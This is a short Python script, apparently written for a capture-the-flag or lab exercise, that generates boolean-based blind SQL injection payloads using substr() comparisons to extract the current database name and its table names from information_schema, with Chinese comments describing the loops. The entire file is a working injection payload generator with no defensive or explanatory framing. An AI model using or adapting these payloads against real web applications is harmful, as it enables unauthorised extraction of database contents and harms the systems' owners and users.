# -*- coding: UTF-8 -*- 
import string
alphabet = string.ascii_letters + string.digits + ",}{_="

select = "select database()" 
select = "select group_concat(table_name) from information_schema.tables where table_schema=database()"

for i in range(1,10): # 外层循环，从1开始，因为截取的位数是从1开始的
 for ch in alphabet: # 内层循环，是具体需要测试的值
  payload = f"2019122001' and substr(({select}) ,{i},1) = '{ch}' %23"
  print(payload)